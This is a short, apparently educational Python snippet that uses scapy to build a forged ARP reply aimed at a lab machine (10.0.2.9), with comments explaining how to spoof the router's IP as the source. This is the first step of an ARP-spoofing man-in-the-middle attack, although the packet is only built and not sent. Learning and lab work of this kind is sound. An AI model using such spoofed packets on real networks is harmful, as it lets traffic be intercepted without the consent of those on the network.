import scapy.all as scapy

# # get all possible methods of scapy.ARP()
# print(scapy.ls(scapy.ARP))

# op: when using ARP, replace the default action from RQUEST(op=1) to RESPONSE(op=2)
# pdst: set the IP to the IP address of the target machine (we get it from network_scanner.py)
# hwdst: set the MAC to the target's MAC
# psrc: fake the source (not from my IP but from router's IP) (route -n -> Gateway)
packet = scapy.ARP(op=2, pdst='10.0.2.9', hwdst='08:00:27:e6:e5:59', psrc='10.0.2.1')